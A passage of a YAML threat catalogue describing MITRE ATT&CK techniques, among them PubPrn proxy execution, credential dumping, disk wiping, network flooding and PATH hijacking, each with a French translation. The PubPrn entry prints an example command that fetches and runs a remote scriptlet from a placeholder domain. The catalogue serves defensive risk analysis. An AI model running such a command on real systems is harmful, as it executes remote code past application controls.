    description: 'Adversaries may use PubPrn to proxy execution of malicious remote
      files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005)
      script that publishes a printer to Active Directory Domain Services. The script
      may be signed by Microsoft and is commonly executed through the [Windows Command
      Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>.
      For example, the following code publishes a printer within the specified domain:
      <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation:
      pubprn)


      Adversaries may abuse PubPrn to execute malicious payloads hosted on remote
      sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the
      second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted
      on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>.
      This behavior may bypass signature validation restrictions and application control
      solutions that do not account for abuse of this script.


      In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated
      to prevent proxying execution from a remote site. This is done by limiting the
      protocol specified in the second parameter to <code>LDAP://</code>, vice the
      <code>script:</code> moniker which could be used to reference remote code via
      HTTP(S).

      https://attack.mitre.org/techniques/T1216/001'
    translations:
      fr:
        name: PubPrn
        description: "Les adversaires peuvent utiliser PubPrn pour l\u2019ex\xE9cution\
          \ par proxy de fichiers distants malveillants. PubPrn.vbs est un script\
          \ [Visual Basic](https://attack.mitre.org/techniques/T1059/005) qui publie\
          \ une imprimante dans les services de domaine Active Directory. Le script\
          \ peut \xEAtre sign\xE9 par Microsoft et est g\xE9n\xE9ralement ex\xE9cut\xE9\
          \ via le [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003)\
          \ via <code>Cscript.exe</code>. Par exemple, le code suivant publie une\
          \ imprimante dans le domaine sp\xE9cifi\xE9 : <code>cscript pubprn Printer1\
          \ LDAP\_://CN=Container1,DC=Domain1,DC=Com</code>. (Citation : pubprn)\n\
          \nLes adversaires peuvent abuser de PubPrn pour ex\xE9cuter des charges\
          \ utiles malveillantes h\xE9berg\xE9es sur des sites distants. (Citation\
          \ : Enigma0x3 PubPrn Bypass) Pour ce faire, les adversaires peuvent d\xE9\
          finir le deuxi\xE8me <code>param\xE8tre script\_:</code> pour r\xE9f\xE9\
          rencer un fichier scriptlet (.sct) h\xE9berg\xE9 sur un site distant. Un\
          \ exemple de commande est <code>pubprn.vbs 127.0.0.1 script\_:https\_://mydomain.com/folder/file.sct</code>.\
          \ Ce comportement peut contourner les restrictions de validation de signature\
          \ et les solutions de contr\xF4le d\u2019application qui ne tiennent pas\
          \ compte de l\u2019utilisation abusive de ce script.\n\nDans les versions\
          \ ult\xE9rieures de Windows (10+), <code>PubPrn.vbs</code> a \xE9t\xE9 mis\
          \ \xE0 jour pour emp\xEAcher l\u2019ex\xE9cution de proxy \xE0 partir d\u2019\
          un site distant. Cela se fait en limitant le protocole sp\xE9cifi\xE9 dans\
          \ le deuxi\xE8me param\xE8tre \xE0 <code>LDAP://</code>, au lieu du moniker\
          \ <code>script\_:</code> qui pourrait \xEAtre utilis\xE9 pour r\xE9f\xE9\
          rencer du code distant via HTTP(S).\nhttps://attack.mitre.org/techniques/T1216/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1597.002
    ref_id: T1597.002
    name: Purchase Technical Data
    description: "Adversaries may purchase technical information about victims that\
      \ can be used during targeting. Information about victims may be available for\
      \ purchase within reputable private sources and databases, such as paid subscriptions\
      \ to feeds of scan databases or other data aggregation services. Adversaries\
      \ may also purchase information from less-reputable sources such as dark web\
      \ or cybercrime blackmarkets.\n\nAdversaries may purchase information about\
      \ their already identified targets, or use purchased data to discover opportunities\
      \ for successful breaches. Threat actors may gather various technical details\
      \ from purchased data, including but not limited to employee contact information,\
      \ credentials, or specifics regarding a victim\u2019s infrastructure.(Citation:\
      \ ZDNET Selling Data) Information from these sources may reveal opportunities\
      \ for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
      \ or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),\
      \ establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)\
      \ or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or\
      \ initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)\
      \ or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).\nhttps://attack.mitre.org/techniques/T1597/002"
    translations:
      fr:
        name: "Donn\xE9es techniques d\u2019achat"
        description: "Les adversaires peuvent acheter des informations techniques\
          \ sur les victimes qui peuvent \xEAtre utilis\xE9es lors du ciblage. Les\
          \ informations sur les victimes peuvent \xEAtre disponibles \xE0 l\u2019\
          achat dans des sources et des bases de donn\xE9es priv\xE9es r\xE9put\xE9\
          es, telles que des abonnements payants \xE0 des flux de bases de donn\xE9\
          es d\u2019analyse ou \xE0 d\u2019autres services d\u2019agr\xE9gation de\
          \ donn\xE9es. Les adversaires peuvent \xE9galement acheter des informations\
          \ aupr\xE8s de sources moins fiables, telles que le dark web ou les march\xE9\
          s noirs de la cybercriminalit\xE9.\n\nLes adversaires peuvent acheter des\
          \ informations sur leurs cibles d\xE9j\xE0 identifi\xE9es ou utiliser des\
          \ donn\xE9es achet\xE9es pour d\xE9couvrir des opportunit\xE9s de violations\
          \ r\xE9ussies. Les auteurs de menace peuvent recueillir divers d\xE9tails\
          \ techniques \xE0 partir des donn\xE9es achet\xE9es, y compris, mais sans\
          \ s\u2019y limiter, les coordonn\xE9es des employ\xE9s, les informations\
          \ d\u2019identification ou des d\xE9tails concernant l\u2019infrastructure\
          \ d\u2019une victime. (Citation : Donn\xE9es de vente ZDNET) Les informations\
          \ provenant de ces sources peuvent r\xE9v\xE9ler des possibilit\xE9s pour\
          \ d\u2019autres formes de reconnaissance (ex : [Phishing pour obtenir de\
          \ l\u2019information](https://attack.mitre.org/techniques/T1598) ou [Recherche\
          \ de sites Web/domaines ouverts](https://attack.mitre.org/techniques/T1593)),\
          \ d\u2019\xE9tablissement de ressources op\xE9rationnelles (ex : [D\xE9\
          velopper des capacit\xE9s](https://attack.mitre.org/techniques/T1587) ou\
          \ [Obtenir des capacit\xE9s](https://attack.mitre.org/techniques/T1588)),\
          \ et/ou d\u2019acc\xE8s initial (ex : [Externe \xE0 distance Services](https://attack.mitre.org/techniques/T1133)\
          \ ou [Comptes valides](https://attack.mitre.org/techniques/T1078)).\nhttps://attack.mitre.org/techniques/T1597/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003
    ref_id: T1003
    name: OS Credential Dumping
    description: 'Adversaries may attempt to dump credentials to obtain account login
      and credential material, normally in the form of a hash or a clear text password.
      Credentials can be obtained from OS caches, memory, or structures.(Citation:
      Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008)
      and access restricted information.


      Several of the tools mentioned in associated sub-techniques may be used by both
      adversaries and professional security testers. Additional custom tools likely
      exist as well.

      https://attack.mitre.org/techniques/T1003'
    translations:
      fr:
        name: "Vidage des informations d\u2019identification du syst\xE8me d\u2019\
          exploitation"
        description: "Les adversaires peuvent tenter de vider les informations d\u2019\
          identification pour obtenir des informations d\u2019identification et de\
          \ connexion au compte, g\xE9n\xE9ralement sous la forme d\u2019un hachage\
          \ ou d\u2019un mot de passe en texte clair. Les informations d\u2019identification\
          \ peuvent \xEAtre obtenues \xE0 partir des caches, de la m\xE9moire ou des\
          \ structures du syst\xE8me d\u2019exploitation. (Citation : Brining MimiKatz\
          \ \xE0 Unix) Les informations d\u2019identification peuvent ensuite \xEA\
          tre utilis\xE9es pour effectuer [Mouvement lat\xE9ral](https://attack.mitre.org/tactics/TA0008)\
          \ et acc\xE9der \xE0 des informations restreintes.\n\nPlusieurs des outils\
          \ mentionn\xE9s dans les sous-techniques associ\xE9es peuvent \xEAtre utilis\xE9\
          s \xE0 la fois par des adversaires et des testeurs de s\xE9curit\xE9 professionnels.\
          \ D\u2019autres outils personnalis\xE9s existent probablement aussi.\nhttps://attack.mitre.org/techniques/T1003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1129
    ref_id: T1129
    name: Shared Modules
    description: 'Adversaries may execute malicious payloads via loading shared modules.
      Shared modules are executable files that are loaded into processes to provide
      access to reusable code, such as specific custom functions or invoking OS API
      functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).


      Adversaries may use this functionality as a way to execute arbitrary payloads
      on a victim system. For example, adversaries can modularize functionality of
      their malware into shared objects that perform various functions such as managing
      C2 network communications or execution of specific actions on objective.


      The Linux & macOS module loader can load and execute shared objects from arbitrary
      local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen`
      and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib`
      files.(Citation: Apple Dev Dynamic Libraries)(Citation: Linux Shared Libraries)(Citation:
      RotaJakiro 2021 netlab360 analysis)(Citation: Unit42 OceanLotus 2017)


      The Windows module loader can be instructed to load DLLs from arbitrary local
      paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality
      resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106)
      which is called from functions like `LoadLibrary` at run time.(Citation: Microsoft
      DLL)

      https://attack.mitre.org/techniques/T1129'
    translations:
      fr:
        name: "Modules partag\xE9s"
        description: "Les adversaires peuvent ex\xE9cuter des charges utiles malveillantes\
          \ en chargeant des modules partag\xE9s. Les modules partag\xE9s sont des\
          \ fichiers ex\xE9cutables qui sont charg\xE9s dans des processus pour fournir\
          \ un acc\xE8s \xE0 du code r\xE9utilisable, tel que des fonctions personnalis\xE9\
          es sp\xE9cifiques ou l\u2019appel de fonctions API du syst\xE8me d\u2019\
          exploitation (c\u2019est-\xE0-dire, [API native](https://attack.mitre.org/techniques/T1106)).\n\
          \nLes adversaires peuvent utiliser cette fonctionnalit\xE9 comme un moyen\
          \ d\u2019ex\xE9cuter des charges utiles arbitraires sur un syst\xE8me victime.\
          \ Par exemple, les adversaires peuvent modulariser les fonctionnalit\xE9\
          s de leurs logiciels malveillants en objets partag\xE9s qui ex\xE9cutent\
          \ diverses fonctions telles que la gestion des communications r\xE9seau\
          \ C2 ou l\u2019ex\xE9cution d\u2019actions sp\xE9cifiques sur objectif.\n\
          \nLe chargeur de modules Linux et macOS peut charger et ex\xE9cuter des\
          \ objets partag\xE9s \xE0 partir de chemins locaux arbitraires. Cette fonctionnalit\xE9\
          \ r\xE9side dans 'dlfcn.h' dans des fonctions telles que 'dlopen' et 'dlsym'.\
          \ Bien que macOS puisse ex\xE9cuter des fichiers \xAB .so \xBB, la pratique\
          \ courante utilise des fichiers \xAB .dylib \xBB. (Citation : Apple Dev\
          \ Dynamic Libraries)(Citation : Biblioth\xE8ques partag\xE9es Linux)(Citation\
          \ : RotaJakiro 2021 analyse netlab360)(Citation : Unit42 OceanLotus 2017)\n\
          \nLe chargeur de module Windows peut recevoir l\u2019instruction de charger\
          \ des DLL \xE0 partir de chemins locaux arbitraires et de chemins r\xE9\
          seau UNC (Universal Naming Convention) arbitraires. Cette fonctionnalit\xE9\
          \ r\xE9side dans 'NTDLL.dll' et fait partie de l'[API native](https://attack.mitre.org/techniques/T1106)\
          \ de Windows qui est appel\xE9e \xE0 partir de fonctions telles que 'LoadLibrary'\
          \ au moment de l\u2019ex\xE9cution. (Citation : Microsoft DLL)\nhttps://attack.mitre.org/techniques/T1129"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1602
    ref_id: T1602
    name: Data from Configuration Repository
    description: 'Adversaries may collect data related to managed devices from configuration
      repositories. Configuration repositories are used by management systems in order
      to configure, manage, and control data on remote systems. Configuration repositories
      may also facilitate remote access and administration of devices.


      Adversaries may target these repositories in order to collect large quantities
      of sensitive system administration data. Data from configuration repositories
      may be exposed by various protocols and software and can store a wide variety
      of data, much of which may align with adversary Discovery objectives.(Citation:
      US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)

      https://attack.mitre.org/techniques/T1602'
    translations:
      fr:
        name: "Donn\xE9es du r\xE9f\xE9rentiel de configuration"
        description: "Les adversaires peuvent collecter des donn\xE9es relatives aux\
          \ appareils g\xE9r\xE9s \xE0 partir de r\xE9f\xE9rentiels de configuration.\
          \ Les r\xE9f\xE9rentiels de configuration sont utilis\xE9s par les syst\xE8\
          mes de gestion pour configurer, g\xE9rer et contr\xF4ler les donn\xE9es\
          \ sur des syst\xE8mes distants. Les r\xE9f\xE9rentiels de configuration\
          \ peuvent \xE9galement faciliter l\u2019acc\xE8s \xE0 distance et l\u2019\
          administration des appareils.\n\nLes adversaires peuvent cibler ces r\xE9\
          f\xE9rentiels afin de collecter de grandes quantit\xE9s de donn\xE9es sensibles\
          \ d\u2019administration syst\xE8me. Les donn\xE9es des r\xE9f\xE9rentiels\
          \ de configuration peuvent \xEAtre expos\xE9es par divers protocoles et\
          \ logiciels et peuvent stocker une grande vari\xE9t\xE9 de donn\xE9es, dont\
          \ une grande partie peut s\u2019aligner sur les objectifs de d\xE9couverte\
          \ de l\u2019adversaire. (R\xE9f\xE9rence : US-CERT-TA18-106A)(R\xE9f\xE9\
          rence : US-CERT TA17-156A SNMP Abuse 2017)\nhttps://attack.mitre.org/techniques/T1602"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1561.002
    ref_id: T1561.002
    name: Disk Structure Wipe
    description: "Adversaries may corrupt or wipe the disk data structures on a hard\
      \ drive necessary to boot a system; targeting specific critical systems or in\
      \ large numbers in a network to interrupt availability to system and network\
      \ resources. \n\nAdversaries may attempt to render the system unable to boot\
      \ by overwriting critical data located in structures such as the master boot\
      \ record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation:\
      \ FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation:\
      \ Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained\
      \ in disk structures may include the initial executable code for loading an\
      \ operating system or the location of the file system partitions on disk. If\
      \ this information is not present, the computer will not be able to load an\
      \ operating system during the boot process, leaving the computer unavailable.\
      \ [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be\
      \ performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001)\
      \ if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may\
      \ reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact\
      \ on the target organization, malware designed for destroying disk structures\
      \ may have worm-like features to propagate across a network by leveraging other\
      \ techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078),\
      \ [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows\
      \ Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec\
      \ Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon\
      \ Nov 2016)(Citation: Kaspersky StoneDrill 2017)\nhttps://attack.mitre.org/techniques/T1561/002"
    translations:
      fr:
        name: Effacement de la structure du disque
        description: "Les adversaires peuvent corrompre ou effacer les structures\
          \ de donn\xE9es du disque dur d\u2019un disque dur n\xE9cessaire au d\xE9\
          marrage d\u2019un syst\xE8me ; Cibler des syst\xE8mes critiques sp\xE9cifiques\
          \ ou en grand nombre dans un r\xE9seau pour interrompre la disponibilit\xE9\
          \ des ressources syst\xE8me et r\xE9seau. \n\nLes adversaires peuvent tenter\
          \ de rendre le syst\xE8me incapable de d\xE9marrer en \xE9crasant les donn\xE9\
          es critiques situ\xE9es dans des structures telles que l\u2019enregistrement\
          \ de d\xE9marrage principal (MBR) ou la table de partition. (R\xE9f\xE9\
          rence : Symantec Shamoon 2012)(Citation : FireEye Shamoon novembre 2016)(Citation\
          \ : Palo Alto Shamoon, novembre 2016)(Citation : Kaspersky StoneDrill 2017)(Citation\
          \ : Unit\xE9 42 Shamoon3 2018) Les donn\xE9es contenues dans les structures\
          \ de disque peuvent inclure le code ex\xE9cutable initial pour le chargement\
          \ d\u2019un syst\xE8me d\u2019exploitation ou l\u2019emplacement des partitions\
          \ du syst\xE8me de fichiers sur le disque. Si ces informations ne sont pas\
          \ pr\xE9sentes, l\u2019ordinateur ne sera pas en mesure de charger un syst\xE8\
          me d\u2019exploitation pendant le processus de d\xE9marrage, laissant l\u2019\
          ordinateur indisponible. [Effacement de la structure du disque](https://attack.mitre.org/techniques/T1561/002)\
          \ peut \xEAtre effectu\xE9 de mani\xE8re isol\xE9e ou en m\xEAme temps que\
          \ [Effacement du contenu du disque](https://attack.mitre.org/techniques/T1561/001)\
          \ si tous les secteurs d\u2019un disque sont effac\xE9s.\n\nSur les p\xE9\
          riph\xE9riques r\xE9seau, les adversaires peuvent reformater le syst\xE8\
          me de fichiers \xE0 l\u2019aide des commandes [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
          \ telles que 'format'. (R\xE9f\xE9rence : format_cmd_cisco)\n\nPour maximiser\
          \ l\u2019impact sur l\u2019organisation cible, les programmes malveillants\
          \ con\xE7us pour d\xE9truire les structures de disque peuvent avoir des\
          \ fonctionnalit\xE9s de type ver pour se propager sur un r\xE9seau en exploitant\
          \ d\u2019autres techniques telles que [Comptes valides](https://attack.mitre.org/techniques/T1078),\
          \ [Vidage des informations d\u2019identification du syst\xE8me d\u2019exploitation](https://attack.mitre.org/techniques/T1003)\
          \ et [Partages SMB/Windows Admin](https://attack.mitre.org/techniques/T1021/002).\
          \ (R\xE9f\xE9rence : Symantec Shamoon 2012)(Citation : FireEye Shamoon novembre\
          \ 2016)(Citation : Palo Alto Shamoon, novembre 2016)(Citation : Kaspersky\
          \ StoneDrill 2017)\nhttps://attack.mitre.org/techniques/T1561/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1498.001
    ref_id: T1498.001
    name: Direct Network Flood
    description: 'Adversaries may attempt to cause a denial of service (DoS) by directly
      sending a high-volume of network traffic to a target. This DoS attack may also
      reduce the availability and functionality of the targeted system(s) and network.
      [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when
      one or more systems are used to send a high-volume of network packets towards
      the targeted service''s network. Almost any network protocol may be used for
      flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful
      protocols such as TCP can be used as well.


      Botnets are commonly used to conduct network flooding attacks against networks
      and services. Large botnets can generate a significant amount of traffic from
      systems spread across the global Internet. Adversaries may have the resources
      to build out and control their own botnet infrastructure or may rent time on
      an existing botnet to conduct an attack. In some of the worst cases for distributed
      DoS (DDoS), so many systems are used to generate the flood that each one only
      needs to send out a small amount of traffic to produce enough volume to saturate
      the target network. In such circumstances, distinguishing DDoS traffic from
      legitimate clients becomes exceedingly difficult. Botnets have been used in
      some of the most high-profile DDoS flooding attacks, such as the 2012 series
      of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March
      2016)

      https://attack.mitre.org/techniques/T1498/001'
    translations:
      fr:
        name: "Inondation directe du r\xE9seau"
        description: "Les adversaires peuvent tenter de provoquer un d\xE9ni de service\
          \ (DoS) en envoyant directement un volume \xE9lev\xE9 de trafic r\xE9seau\
          \ \xE0 une cible. Cette attaque DoS peut \xE9galement r\xE9duire la disponibilit\xE9\
          \ et la fonctionnalit\xE9 du ou des syst\xE8mes et du r\xE9seau cibl\xE9\
          s. [Inondation directe du r\xE9seau]Les (https://attack.mitre.org/techniques/T1498/001)\
          \ sont lorsqu\u2019un ou plusieurs syst\xE8mes sont utilis\xE9s pour envoyer\
          \ un volume \xE9lev\xE9 de paquets r\xE9seau vers le r\xE9seau du service\
          \ cibl\xE9. Presque tous les protocoles r\xE9seau peuvent \xEAtre utilis\xE9\
          s pour l\u2019inondation. Les protocoles sans \xE9tat tels que UDP ou ICMP\
          \ sont couramment utilis\xE9s, mais les protocoles avec \xE9tat tels que\
          \ TCP peuvent \xE9galement \xEAtre utilis\xE9s.\n\nLes botnets sont couramment\
          \ utilis\xE9s pour mener des attaques d\u2019inondation de r\xE9seau contre\
          \ les r\xE9seaux et les services. Les botnets de grande taille peuvent g\xE9\
          n\xE9rer une quantit\xE9 importante de trafic \xE0 partir de syst\xE8mes\
          \ r\xE9partis sur l\u2019Internet mondial. Les adversaires peuvent disposer\
          \ des ressources n\xE9cessaires pour d\xE9velopper et contr\xF4ler leur\
          \ propre infrastructure de botnet ou louer du temps sur un botnet existant\
          \ pour mener une attaque. Dans certains des pires cas de DoS distribu\xE9\
          \ (DDoS), tant de syst\xE8mes sont utilis\xE9s pour g\xE9n\xE9rer le flood\
          \ que chacun n\u2019a besoin d\u2019envoyer qu\u2019une petite quantit\xE9\
          \ de trafic pour produire un volume suffisant pour saturer le r\xE9seau\
          \ cible. Dans de telles circonstances, il devient extr\xEAmement difficile\
          \ de distinguer le trafic DDoS des clients l\xE9gitimes. Les botnets ont\
          \ \xE9t\xE9 utilis\xE9s dans certaines des attaques DDoS flooding les plus\
          \ m\xE9diatis\xE9es, telles que la s\xE9rie d\u2019incidents de 2012 qui\
          \ ont cibl\xE9 de grandes banques am\xE9ricaines. (Citation : USNYAG IranianBotnet\
          \ mars 2016)\nhttps://attack.mitre.org/techniques/T1498/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.007
    ref_id: T1574.007
    name: Path Interception by PATH Environment Variable
    description: "Adversaries may execute their own malicious payloads by hijacking\
      \ environment variables used to load libraries. The PATH environment variable\
      \ contains a list of directories (User and System) that the OS searches sequentially\
      \ through in search of the binary that was called from a script or the command\
      \ line. \n\nAdversaries can place a malicious program in an earlier entry in\
      \ the list of directories stored in the PATH environment variable, resulting\
      \ in the operating system executing the malicious binary rather than the legitimate\
      \ binary when it searches sequentially through that PATH listing.\n\nFor example,\
      \ on Windows if an adversary places a malicious program named \"net.exe\" in\
      \ `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe`\
      \ in the PATH environment variable, when \"net\" is executed from the command-line\
      \ the `C:\\example path` will be called instead of the system's legitimate executable\
      \ at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely\
      \ on the PATH environment variable to determine the locations that are searched\
      \ when the path for the program is not given, such as executing programs from\
      \ a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation:\
      \ ExpressVPN PATH env Windows 2021)\n\nAdversaries may also directly modify\
      \ the $PATH variable specifying the directories to be searched.  An adversary\
      \ can modify the `$PATH` variable to point to a directory they have write access.\
      \ When a program using the $PATH variable is called, the OS searches the specified\
      \ directory and executes the malicious binary. On macOS, this can also be performed\
      \ through modifying the $HOME variable. These variables can be modified using\
      \ the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004),\
      \ or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC\
      \ linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic\
      \ Rules macOS launchctl 2022)\nhttps://attack.mitre.org/techniques/T1574/007"
    translations:
      fr:
        name: "Interception de chemin par la variable d\u2019environnement PATH"
        description: "Les adversaires peuvent ex\xE9cuter leurs propres charges utiles\
          \ malveillantes en d\xE9tournant les variables d\u2019environnement utilis\xE9\
          es pour charger les biblioth\xE8ques. La variable d\u2019environnement PATH\
          \ contient une liste de r\xE9pertoires (Utilisateur et Syst\xE8me) que le\
          \ syst\xE8me d\u2019exploitation parcourt s\xE9quentiellement \xE0 la recherche\
          \ du binaire appel\xE9 \xE0 partir d\u2019un script ou de la ligne de commande.\
          \ \n\nLes adversaires peuvent placer un programme malveillant dans une entr\xE9\
          e ant\xE9rieure de la liste des r\xE9pertoires stock\xE9s dans la variable\
          \ d\u2019environnement PATH, ce qui fait que le syst\xE8me d\u2019exploitation\
          \ ex\xE9cute le binaire malveillant plut\xF4t que le binaire l\xE9gitime\
          \ lorsqu\u2019il effectue une recherche s\xE9quentielle dans cette liste\
          \ PATH.\n\nPar exemple, sous Windows, si un adversaire place un programme\
          \ malveillant nomm\xE9 \xAB\_net.exe\_\xBB dans 'C\_:\\example path', qui\
          \ pr\xE9c\xE8de par d\xE9faut 'C\_:\\Windows\\system32\\net.exe' dans la\
          \ variable d\u2019environnement PATH, lorsque \xAB\_net\_\xBB est ex\xE9\
          cut\xE9 \xE0 partir de la ligne de commande, 'C\_:\\example path' sera appel\xE9\
          \ \xE0 la place de l\u2019ex\xE9cutable l\xE9gitime du syst\xE8me \xE0 'C\_\
          :\\Windows\\system32\\net.exe. Certaines m\xE9thodes d\u2019ex\xE9cution\
          \ d\u2019un programme s\u2019appuient sur la variable d\u2019environnement\
          \ PATH pour d\xE9terminer les emplacements recherch\xE9s lorsque le chemin\
          \ d\u2019acc\xE8s du programme n\u2019est pas indiqu\xE9, comme l\u2019\
          ex\xE9cution de programmes \xE0 partir d\u2019un [interpr\xE9teur de commandes\
          \ et de scripts](https://attack.mitre.org/techniques/T1059). (Citation\_\
          : ExpressVPN PATH env Windows 2021)\n\nLes adversaires peuvent \xE9galement\
          \ modifier directement la variable $PATH en sp\xE9cifiant les r\xE9pertoires\
          \ \xE0 rechercher.  Un adversaire peut modifier la variable '$PATH' pour\
          \ qu\u2019elle pointe vers un r\xE9pertoire auquel il a un acc\xE8s en \xE9\
          criture. Lorsqu\u2019un programme utilisant la variable $PATH est appel\xE9\
          , le syst\xE8me d\u2019exploitation recherche le r\xE9pertoire sp\xE9cifi\xE9\
          \ et ex\xE9cute le binaire malveillant. Sur macOS, cela peut \xE9galement\
          \ \xEAtre effectu\xE9 en modifiant la variable $HOME. Ces variables peuvent\
          \ \xEAtre modifi\xE9es \xE0 l\u2019aide de la ligne de commande, de launchctl,\
          \ de [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004),\
          \ ou en modifiant le contenu du dossier '/etc/paths.d'. (Citation\_: uptycs\
          \ Fake POC linux malware 2023)(Citation : Variables PATH macOS nixCraft)(Citation\
          \ : Elastic Rules macOS launchctl 2022)\nhttps://attack.mitre.org/techniques/T1574/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213.002
    ref_id: T1213.002
    name: Sharepoint
    description: 'Adversaries may leverage the SharePoint repository as a source to
      mine valuable information. SharePoint will often contain useful information
      for an adversary to learn about the structure and functionality of the internal
      network and systems. For example, the following is a list of example information
      that may hold potential value to an adversary and may also be found on SharePoint:


      * Policies, procedures, and standards

      * Physical / logical network diagrams

      * System architecture diagrams

      * Technical system documentation

      * Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))

      * Work / project schedules

      * Source code snippets

      * Links to network shares and other internal resources

      https://attack.mitre.org/techniques/T1213/002'
    translations:
      fr:
        name: Sharepoint
        description: "Les adversaires peuvent exploiter le r\xE9f\xE9rentiel SharePoint\
          \ comme source pour extraire des informations pr\xE9cieuses. SharePoint\
          \ contient souvent des informations utiles pour qu\u2019un adversaire puisse\
          \ en savoir plus sur la structure et les fonctionnalit\xE9s du r\xE9seau\
          \ et des syst\xE8mes internes. Par exemple, voici une liste d\u2019exemples\
          \ d\u2019informations qui peuvent avoir une valeur potentielle pour un adversaire\
          \ et qui peuvent \xE9galement \xEAtre trouv\xE9es sur SharePoint :\n\n*\
          \ Politiques, proc\xE9dures et normes\n* Diagrammes de r\xE9seau physiques\
          \ / logiques\n* Diagrammes d\u2019architecture syst\xE8me\n* Documentation\
          \ technique du syst\xE8me\n* R\xE9f\xE9rences de test/d\xE9veloppement (c\u2019\
          est-\xE0-dire, [Informations d\u2019identification non s\xE9curis\xE9es](https://attack.mitre.org/techniques/T1552))\n\
          * Calendriers de travaux / projets\n* Extraits de code source\n* Liens vers\
          \ des partages de r\xE9seau et d\u2019autres ressources internes\nhttps://attack.mitre.org/techniques/T1213/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1006
    ref_id: T1006
    name: Direct Volume Access
    description: 'Adversaries may directly access a volume to bypass file access controls
      and file system monitoring. Windows allows programs to have direct access to
      logical volumes. Programs with direct access may read and write files directly
      from the drive by analyzing file system data structures. This technique may
      bypass Windows file access controls as well as file system monitoring tools.
      (Citation: Hakobyan 2009)


      Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation:
      Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party
      utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404))
      to create shadow copies or backups of data from system volumes.(Citation: LOLBAS
      Esentutl)

      https://attack.mitre.org/techniques/T1006'
    translations:
      fr:
        name: "Acc\xE8s direct aux volumes"
        description: "Les adversaires peuvent acc\xE9der directement \xE0 un volume\
          \ pour contourner les contr\xF4les d\u2019acc\xE8s aux fichiers et la surveillance\
          \ du syst\xE8me de fichiers. Windows permet aux programmes d\u2019avoir\
          \ un acc\xE8s direct aux volumes logiques. Les programmes disposant d\u2019\
          un acc\xE8s direct peuvent lire et \xE9crire des fichiers directement \xE0\
          \ partir du lecteur en analysant les structures de donn\xE9es du syst\xE8\
          me de fichiers. Cette technique peut contourner les contr\xF4les d\u2019\
          acc\xE8s aux fichiers Windows ainsi que les outils de surveillance du syst\xE8\
          me de fichiers. (Citation : Hakobyan 2009)\n\nDes utilitaires, tels que\
          \ \xAB NinjaCopy \xBB, existent pour effectuer ces actions dans PowerShell.\
          \ (Citation : github powersploit ninjacopy) Les adversaires peuvent \xE9\
          galement utiliser des utilitaires int\xE9gr\xE9s ou tiers (tels que 'vssadmin',\
          \ 'wbadmin' et [esentutl](https://attack.mitre.org/software/S0404)) pour\
          \ cr\xE9er des clich\xE9s instantan\xE9s ou des sauvegardes de donn\xE9\
          es \xE0 partir de volumes syst\xE8me. (Citation : LOLBAS Esentutl)\nhttps://attack.mitre.org/techniques/T1006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.007
    ref_id: T1588.007
    name: Artificial Intelligence
    description: 'Adversaries may obtain access to generative artificial intelligence
